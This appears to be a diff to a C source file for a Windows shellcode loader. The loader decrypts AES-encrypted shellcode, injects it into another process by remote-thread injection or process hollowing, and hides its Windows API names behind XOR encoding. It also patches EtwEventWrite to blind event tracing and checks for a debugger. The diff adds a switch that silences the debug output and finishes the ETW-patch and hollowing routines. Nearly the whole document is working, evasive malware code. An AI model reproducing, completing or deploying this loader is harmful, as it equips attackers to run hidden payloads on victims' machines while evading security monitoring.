@@ -14,6 +14,16 @@
 #define AES_BLOCK_SIZE 16
 #define XR_KSIZE 16
 
+// Define variable to print lines or not
+#define EN_PRT 1
+#if EN_PRT
+#define m_prt(fmt, ...) printf(fmt, ##__VA_ARGS__)
+#define m_fprt(file, fmt, ...) fprintf(file, fmt, ##__VA_ARGS__)
+#else
+#define m_prt(fmt, ...) /* No-op */
+#define m_fprt(file, fmt, ...) /* No-op */
+#endif
+
 // ----------- BEGIN CHANGE THIS BLOCK ---------------
 // Also check the winapi.h containing XOR key used to encode WinAPI functions during compiling
 #define ORIG_SC_LEN 244
@@ -87,8 +97,8 @@ int main(int argc, char** argv)
     dec_vars();
 
     // DEBUG PRINTING
-    printf("Decoded XOR key: %s\n", xrKey);
-    printf("Decoded password: %s\n", Pwd);
+    m_prt("Decoded XOR key: %s\n", xrKey);
+    m_prt("Decoded password: %s\n", Pwd);
     size_t lenSlt = strlen((char*)Slt);
     prt_dat("Decoded salt", Slt, lenSlt, 1);
     size_t lenIv = strlen((char*)Iv);
@@ -102,7 +112,7 @@ int main(int argc, char** argv)
     // Derive key and IV using PBKDF2 from the hardcoded pswd and salt
     //if (!PKCS5_PBKDF2_HMAC_SHA1((char*)pswd, strlen((char*)pswd), salt, sizeof(salt), 10000, sizeof(derivedKey), derivedKey)) {
     if (!PKCS5_PBKDF2_HMAC_SHA1(Pwd, strlen((char*)Pwd), Slt, lenSlt, 10000, sizeof(derivedKey), derivedKey)) {
-        fprintf(stderr, "Error deriving key and IV with PBKDF2\n");
+        m_fprt(stderr, "Error deriving key and IV with PBKDF2\n");
         exit(-1);
     }
 
@@ -113,7 +123,7 @@ int main(int argc, char** argv)
     const size_t lenDec = ((lenShell + AES_BLOCK_SIZE - 1) / AES_BLOCK_SIZE) * AES_BLOCK_SIZE;  // Ensure we have a multiple of AES_BLOCK_SIZE
     unsigned char* shell_dec = malloc(lenDec);  // Allocate memory for decrypted shellcode
     if (!shell_dec) {
-        perror("malloc failed");
+        m_prt("malloc failed\n");
         exit(-1);
     }
     memset(shell_dec, 0, lenDec);  // Padding the encrypted data buffer
@@ -122,7 +132,7 @@ int main(int argc, char** argv)
     //int lenDecShell = decr(encr_sc, lenDec, aesKey, ivDec, shell_dec);
     int lenDecShell = decr(Sc, lenDec, aesKey, ivDec, shell_dec);
     if (lenDecShell == 0) {
-        fprintf(stderr, "Error finalizing AES decryption\n");
+        m_fprt(stderr, "Error finalizing AES decryption\n");
         free(shell_dec);
         return -1;
     }
@@ -151,7 +161,7 @@ int main(int argc, char** argv)
         proc_hol(decr_sc, sizeof(decr_sc), baseaddr, pid);
     }
     else {
-        fprintf(stderr, "Failed to find the process %s\n", processinj);
+        m_fprt(stderr, "Failed to find the process %s\n", processinj);
         free(shell_dec);
         return -1;
     }
@@ -184,22 +194,22 @@ void cp_arr(unsigned char* src, unsigned char* dest, int src_len, int dest_len) 
 
 void prt_dat(const char* title, const void* data, int len, int is_oneliner)
 {
-    printf("%s:\n", title);
+    m_prt("%s:\n", title);
     unsigned char* p = (unsigned char*)data;
 
     if (is_oneliner) {
-        printf("\"");
+        m_prt("\"");
         for (int i = 0; i < len; i++) {
-            printf("\\x%02X", p[i]);
+            m_prt("\\x%02X", p[i]);
         }
-        printf("\"\n");
+        m_prt("\"\n");
     }
     else {
-        printf("  ");
+        m_prt("  ");
         for (int i = 0; i < len; i++) {
-            printf("\\x%02X", p[i]);
+            m_prt("\\x%02X", p[i]);
         }
-        printf("\n");
+        m_prt("\n");
     }
 }
 
@@ -209,8 +219,8 @@ void* lookup_func(const char* moduleName, const char* functionName) {
     if (hModule == NULL) {
         // Module is not loaded, retrieve the last error and provide more information
         //DWORD error = GetLastError();
-        //printf("Module not found: %s (Error Code: %lu)\n", moduleName, error);
-        printf("Module not found: %s\n", moduleName);
+        //m_prt("Module not found: %s (Error Code: %lu)\n", moduleName, error);
+        m_prt("Module not found: %s\n", moduleName);
         return NULL;
     }
 
@@ -219,8 +229,8 @@ void* lookup_func(const char* moduleName, const char* functionName) {
     if (funcAddress == NULL) {
         // Function is not found, retrieve the last error for more context
         //DWORD error = GetLastError();
-        //printf("Function not found: %s (Error Code: %lu)\n", functionName, error);
-        printf("Function not found: %s\n", functionName);
+        //m_prt("Function not found: %s (Error Code: %lu)\n", functionName, error);
+        m_prt("Function not found: %s\n", functionName);
         return NULL;
     }
 
@@ -230,12 +240,12 @@ void* lookup_func(const char* moduleName, const char* functionName) {
 int fnd_proc(const char* process_name, int* pid, int* baseaddr) {
     DWORD processes[1024], cbNeeded, cProcesses;
 
-    printf("\nFinding process ID and base address based on name %s ...\n", process_name);
+    m_prt("\nFinding process ID and base address based on name %s ...\n", process_name);
 
     // Enumerate all processes
     pEnumProcesses NtEnumProcesses = (pEnumProcesses)lookup_func(papdl, pEnProc);
     if(!NtEnumProcesses(processes, sizeof(processes), &cbNeeded)) {
-        fprintf(stderr, "EnumProcesses failed\n");
+        m_fprt(stderr, "EnumProcesses failed\n");
         return 0;
     }
 
@@ -257,7 +267,7 @@ int fnd_proc(const char* process_name, int* pid, int* baseaddr) {
             DWORD cbNeededModules;
             HMODULE hMods[1024];
             if (NtEnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeededModules)) {
-                //printf("Found %lu modules for process %lu\n", cbNeededModules / sizeof(HMODULE), processes[i]);
+                //m_prt("Found %lu modules for process %lu\n", cbNeededModules / sizeof(HMODULE), processes[i]);
                 for (unsigned int j = 0; j < (cbNeededModules / sizeof(HMODULE)); j++) {
                     char filename[MAX_PATH];
                     if (NtGetModuleFileNameExA(hProcess, hMods[j], filename, sizeof(filename) / sizeof(char))) {
@@ -265,7 +275,7 @@ int fnd_proc(const char* process_name, int* pid, int* baseaddr) {
                         if (_stricmp(filename, process_name) == 0) {
                             *pid = (int)processes[i];
                             *baseaddr = (int)hMods[j];
-                            printf("Found matching process: %d (%s)\nBase address: %x\n\n", *pid, filename, *baseaddr);
+                            m_prt("Found matching process: %d (%s)\nBase address: %x\n\n", *pid, filename, *baseaddr);
                             NtCloseHandle(hProcess);
                             return 1;
                         }
@@ -286,7 +296,7 @@ void inj_sc(DWORD pid, unsigned char* shellcode, int shellcode_len) {
     // Open the target process with appropriate access
     HANDLE hProcess = NtOpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, pid);
     if (!hProcess) {
-        fprintf(stderr, "Failed to open process (PID: %lu) - Error: %lu\n", pid, NtGetLastError());
+        m_fprt(stderr, "Failed to open process (PID: %lu) - Error: %lu\n", pid, NtGetLastError());
         return;
     }
 
@@ -296,7 +306,7 @@ void inj_sc(DWORD pid, unsigned char* shellcode, int shellcode_len) {
     // Allocate memory in the target process to store the shellcode
     LPVOID remoteMemory = NtVirtualAllocEx(hProcess, NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (!remoteMemory) {
-        fprintf(stderr, "Failed to allocate memory in target process\n");
+        m_fprt(stderr, "Failed to allocate memory in target process\n");
         pCloseHandle NtCloseHandle = (pCloseHandle)lookup_func(k32dl, kChand);
         NtCloseHandle(hProcess);
         return;
@@ -305,7 +315,7 @@ void inj_sc(DWORD pid, unsigned char* shellcode, int shellcode_len) {
     // Write the shellcode to the allocated memory
     pWriteProcessMemory NtWriteProcessMemory = (pWriteProcessMemory)lookup_func(k32dl, kWpm);
     if (!NtWriteProcessMemory(hProcess, remoteMemory, shellcode, shellcode_len, NULL)) {
-        fprintf(stderr, "Failed to write shellcode to process memory\n");
+        m_fprt(stderr, "Failed to write shellcode to process memory\n");
         pVirtualFreeEx NtVirtualFreeEx = (pVirtualFreeEx)lookup_func(k32dl, kVFrEx);
         NtVirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
         pCloseHandle NtCloseHandle = (pCloseHandle)lookup_func(k32dl, kChand);
@@ -317,7 +327,7 @@ void inj_sc(DWORD pid, unsigned char* shellcode, int shellcode_len) {
     pCreateRemoteThread NtCreateRemoteThread = (pCreateRemoteThread)lookup_func(k32dl, kCrRemThr);
     HANDLE hThread = NtCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMemory, NULL, 0, NULL);
     if (!hThread) {
-        fprintf(stderr, "Failed to create remote thread - Error: %lu\n", NtGetLastError());
+        m_fprt(stderr, "Failed to create remote thread - Error: %lu\n", NtGetLastError());
         pVirtualFreeEx NtVirtualFreeEx = (pVirtualFreeEx)lookup_func(k32dl, kVFrEx);
         NtVirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
         pCloseHandle NtCloseHandle = (pCloseHandle)lookup_func(k32dl, kChand);
@@ -336,9 +346,9 @@ void inj_sc(DWORD pid, unsigned char* shellcode, int shellcode_len) {
     NtVirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
     NtCloseHandle(hProcess);
 
-    printf("Shellcode injected and executed successfully.\n");
+    m_prt("Shellcode injected and executed successfully.\n");
 }
-// DEFUNCT
+// Process hollowing function
 void proc_hol(unsigned char* shellcode, int shellcode_len, int baseaddr, int targetPid)
 {
     pNtQueryInformationProcess NtQueryInformationProcess = (pNtQueryInformationProcess)lookup_func(ntdl, nNqip);
@@ -366,29 +376,27 @@ void proc_hol(unsigned char* shellcode, int shellcode_len, int baseaddr, int tar
     HANDLE hProcess = NtOpenProcess(access, FALSE, targetPid);
     if (!hProcess) {
         DWORD dwError = GetLastError();
-        printf("Failed to open target process: 0x%X\n", dwError);
+        m_prt("Failed to open target process: 0x%X\n", dwError);
         return;
     }
 
     // Create the target process in a suspended state
     if (!NtCreateProcessA(NULL, processinj, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
-    //if (!NtCreateProcessA(NULL, targetProc, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
-        // DWORD dwError = GetLastError();
         DWORD dwError = NtGetLastError();
-        fprintf(stderr, "Failed to create process %s in suspended state\n", processinj);
-        //fprintf(stderr, "Failed to create process %s in suspended state\n", targetProc);
-        printf("CreateProcess failed with error code: %lu\n", dwError);
+        m_fprt(stderr, "Failed to create process %s in suspended state\n", processinj);
+        //m_fprt(stderr, "Failed to create process %s in suspended state\n", targetProc);
+        m_prt("CreateProcess failed with error code: %lu\n", dwError);
         return;
     }
 
     // Debug: print the base address to ensure it's correct
-    //printf("Base Address of the Process: 0x%p\n", baseaddr);
+    //m_prt("Base Address of the Process: 0x%p\n", baseaddr);
 
     /*
     // Try to unmap the section with the correct base address
     NTSTATUS unmapStatus = NtUnmapViewOfSection(pi.hProcess, baseaddr);
     if (unmapStatus != 0) {
-        fprintf(stderr, "Failed to unmap view of section in target process, Error Code: 0x%X\n", unmapStatus);
+        m_fprt(stderr, "Failed to unmap view of section in target process, Error Code: 0x%X\n", unmapStatus);
         // Handle error gracefully, terminate process if necessary
         NtTerminateProcess(pi.hProcess, 0);
         NtCloseHandle(pi.hProcess);
@@ -401,7 +409,7 @@ void proc_hol(unsigned char* shellcode, int shellcode_len, int baseaddr, int tar
     LPVOID remoteMemory = NtVirtualAllocEx(pi.hProcess, NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (!remoteMemory) {
         DWORD dwError = NtGetLastError();
-        fprintf(stderr, "Failed to allocate memory in target process - Error: %lu\n", dwError);
+        m_fprt(stderr, "Failed to allocate memory in target process - Error: %lu\n", dwError);
         NtTerminateProcess(pi.hProcess, 0);
         NtCloseHandle(pi.hProcess);
         NtCloseHandle(pi.hThread);
@@ -411,7 +419,7 @@ void proc_hol(unsigned char* shellcode, int shellcode_len, int baseaddr, int tar
     // Write the shellcode to the allocated memory
     if (!NtWriteProcessMemory(pi.hProcess, remoteMemory, shellcode, shellcode_len, NULL)) {
         DWORD dwError = NtGetLastError();
-        fprintf(stderr, "Failed to write shellcode to process memory - Error: %lu\n", dwError);
+        m_fprt(stderr, "Failed to write shellcode to process memory - Error: %lu\n", dwError);
         NtVirtualFreeEx(pi.hProcess, remoteMemory, 0, MEM_RELEASE);
         NtTerminateProcess(pi.hProcess, 0);
         NtCloseHandle(pi.hProcess);
@@ -423,7 +431,7 @@ void proc_hol(unsigned char* shellcode, int shellcode_len, int baseaddr, int tar
     HANDLE hThread = NtCreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMemory, NULL, 0, NULL);
     if (!hThread) {
         DWORD dwError = NtGetLastError();
-        fprintf(stderr, "Failed to create remote thread - Error: %lu\n", dwError);
+        m_fprt(stderr, "Failed to create remote thread - Error: %lu\n", dwError);
         NtVirtualFreeEx(pi.hProcess, remoteMemory, 0, MEM_RELEASE);
         NtTerminateProcess(pi.hProcess, 0);
         NtCloseHandle(pi.hProcess);
@@ -445,7 +453,7 @@ void proc_hol(unsigned char* shellcode, int shellcode_len, int baseaddr, int tar
     NtCloseHandle(pi.hThread);
     NtCloseHandle(pi.hProcess);
 
-    printf("Shellcode injected and executed using Process Hollowing.\n");
+    m_prt("Shellcode injected and executed using Process Hollowing.\n");
 }
 
 int decr(unsigned char* ciphertext, int ciphertext_len, unsigned char* key, unsigned char* iv, unsigned char* plaintext)
@@ -455,18 +463,18 @@ int decr(unsigned char* ciphertext, int ciphertext_len, unsigned char* key, unsi
     int plaintext_len = 0;
 
     if (!ctx) {
-        fprintf(stderr, "Error creating EVP cipher context\n");
+        m_fprt(stderr, "Error creating EVP cipher context\n");
         return 0;
     }
 
     if (1 != EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv)) {
-        fprintf(stderr, "Error initializing decryption\n");
+        m_fprt(stderr, "Error initializing decryption\n");
         EVP_CIPHER_CTX_free(ctx);
         return 0;
     }
 
     if (1 != EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, ciphertext_len)) {
-        fprintf(stderr, "Error during decryption\n");
+        m_fprt(stderr, "Error during decryption\n");
         EVP_CIPHER_CTX_free(ctx);
         return 0;
     }
@@ -474,7 +482,7 @@ int decr(unsigned char* ciphertext, int ciphertext_len, unsigned char* key, unsi
     plaintext_len = len;
 
     if (1 != EVP_DecryptFinal_ex(ctx, plaintext + len, &len)) {
-        fprintf(stderr, "Error finalizing decryption\n");
+        m_fprt(stderr, "Error finalizing decryption\n");
         EVP_CIPHER_CTX_free(ctx);
         return 0;
     }
@@ -491,36 +499,40 @@ int dbg_pres() {
     return NtIsDebuggerPresent();
 }
 
-// Function to disable ETW in the target process
 int dis_et(HANDLE hProcess) {
-    // The patch to disable ETW: xor rax, rax; ret
-    unsigned char patch[] = { 0x48, 0x33, 0xc0, 0xc3 };
-
-    // Lookup function pointers for the required Windows APIs
-    pNtProtectVirtualMemory NtProtectVirtualMemory = (pNtProtectVirtualMemory)lookup_func(ntdl, nProcVmem );
-    pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)lookup_func(ntdl, nWrVMem );
+    unsigned char patch[] = { 0x48, 0x33, 0xc0, 0xc3 };  // Patch to disable ETW
+    pNtProtectVirtualMemory NtProtectVirtualMemory = (pNtProtectVirtualMemory)lookup_func(ntdl, nProcVmem);
+    pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)lookup_func(ntdl, nWrVMem);
+    pVirtualQueryEx NtVirtualQueryEx = (pVirtualQueryEx)lookup_func(k32dl, kVQEx);
     pFlushInstrucionCache NtFlushInstructionCache = (pFlushInstrucionCache)lookup_func(k32dl, kFlInstrC);
     pEventWrite NtEventWrite = (pEventWrite)lookup_func(adv32dl, aEvtWr);
 
-    // Validate function pointers
-    if (!NtProtectVirtualMemory || !NtWriteVirtualMemory || !NtFlushInstructionCache) {
-        printf("Failed to load required functions.\n");
+    if (!NtProtectVirtualMemory || !NtWriteVirtualMemory || !NtFlushInstructionCache || !NtEventWrite) {
+        m_prt("Failed to load required functions.\n");
         return 0;
     }
 
-    // Ensure the hProcess handle is valid
     if (hProcess == NULL) {
-        printf("Invalid process handle.\n");
+        m_prt("Invalid process handle.\n");
         return 0;
     }
 
-    ULONG oldProtect = 0;
-    SIZE_T patchSize = sizeof(patch); // Size of the patch to write into the target process memory
+    m_prt("NtEventWrite address: %p\n", NtEventWrite);
 
-    // Get the current memory protection for NtEventWrite
-    NTSTATUS status = NtProtectVirtualMemory(hProcess, &NtEventWrite, &patchSize, PAGE_EXECUTE_READWRITE, &oldProtect);
+    // Query the memory region where NtEventWrite is located
+    MEMORY_BASIC_INFORMATION mbi;
+    if (NtVirtualQueryEx(hProcess, (LPCVOID)NtEventWrite, &mbi, sizeof(mbi)) == 0) {
+        m_prt("Failed to query memory information for NtEventWrite.\n");
+        return 0;
+    }
+    m_prt("NtEventWrite memory protection: 0x%X\n", mbi.Protect);
+
+    // Change memory protection to allow writing
+    ULONG oldProtect = 0;
+    SIZE_T patchSize = sizeof(patch);
+    NTSTATUS status = NtProtectVirtualMemory(hProcess, (PVOID*)&NtEventWrite, &patchSize, PAGE_EXECUTE_READWRITE, &oldProtect);
     if (status != 0) {
-        printf("Failed to change memory protection: 0x%X\n", status);
+        m_prt("Failed to change memory protection for NtEventWrite: 0x%X\n", status);
         return 0;
     }
 
@@ -528,25 +540,26 @@ int dis_et(HANDLE hProcess) {
     SIZE_T bytesWritten = 0;
     status = NtWriteVirtualMemory(hProcess, (PVOID)NtEventWrite, patch, patchSize, &bytesWritten);
     if (status != 0 || bytesWritten != patchSize) {
-        printf("Failed to write to memory: 0x%X, Bytes written: %zu\n", status, bytesWritten);
-        // Restore the original memory protection before returning
+        m_prt("Failed to write to memory: 0x%X, Bytes written: %zu\n", status, bytesWritten);
+        // Attempt to restore memory protection before returning
         NtProtectVirtualMemory(hProcess, (PVOID*)&NtEventWrite, &patchSize, oldProtect, &oldProtect);
         return 0;
     }
 
-    // After patching, restore the original memory protection
+    // Restore original memory protection
     status = NtProtectVirtualMemory(hProcess, (PVOID*)&NtEventWrite, &patchSize, oldProtect, &oldProtect);
     if (status != 0) {
-        printf("Failed to restore memory protection: 0x%X\n", status);
+        m_prt("Failed to restore memory protection for NtEventWrite: 0x%X\n", status);
         return 0;
     }
 
-    // Flush the instruction cache to ensure the patched code is executed properly
+    // Flush the instruction cache
     NtFlushInstructionCache(hProcess, (PVOID)NtEventWrite, patchSize);
 
-    printf("Successfully disabled ETW in target process by patching EtwEventWrite.\n");
+    m_prt("Successfully disabled ETW in target process by patching EtwEventWrite.\n");
     return 1;
 }
+
 
 void del_ex() {
     srand(time(NULL));
@@ -565,7 +578,7 @@ void xr(char* str, size_t len) {
 unsigned char* xr_dec(const unsigned char* data, size_t len) {
     unsigned char* xordata = (unsigned char*)malloc(len + 1); // +1 for null termination if string
     if (xordata == NULL) {
-        fprintf(stderr, "[!] Error allocating memory for XOR result\n");
+        m_fprt(stderr, "[!] Error allocating memory for XOR result\n");
         exit(-1);
     }
 
@@ -583,13 +596,13 @@ unsigned char* b64_dec(const char* input, int* output_length) {
     int max_output_length = (input_length * 3) / 4; // Estimate output size
     unsigned char* output = (unsigned char*)malloc(max_output_length + 1); // +1 for null terminator
     if (!output) {
-        fprintf(stderr, "Memory allocation failed\n");
+        m_fprt(stderr, "Memory allocation failed\n");
         return NULL;
     }
 
     int len = EVP_DecodeBlock(output, (const unsigned char*)input, input_length);
     if (len < 0) {
-        fprintf(stderr, "Base64 decoding failed\n");
+        m_fprt(stderr, "Base64 decoding failed\n");
         free(output);
         return NULL;
     }
@@ -634,6 +647,7 @@ void dec_vars() {
     xr(papdl, strlen(papdl));
     xr(k32dl, strlen(k32dl));
     xr(ntdl, strlen(ntdl));
+    xr(adv32dl, strlen(adv32dl));
     // Functions
     xr(pEnProc, strlen(pEnProc));
     xr(kOpProc, strlen(kOpProc));
@@ -644,6 +658,7 @@ void dec_vars() {
     xr(kVAlEx, strlen(kVAlEx));
     xr(kWpm, strlen(kWpm));
     xr(kVFrEx, strlen(kVFrEx));
+    xr(kVQEx, strlen(kVQEx));
     xr(kCrRemThr, strlen(kCrRemThr));
     xr(kWSingObj, strlen(kWSingObj));
     xr(nNqip, strlen(nNqip));
@@ -654,6 +669,8 @@ void dec_vars() {
     xr(kDbgPres, strlen(kDbgPres));
     xr(nProcVmem, strlen(nProcVmem));
     xr(nWrVMem, strlen(nWrVMem));
+    xr(nReVMem, strlen(nReVMem));
     xr(kFlInstrC, strlen(kFlInstrC));
     xr(aEvtWr, strlen(aEvtWr));
+    
 }
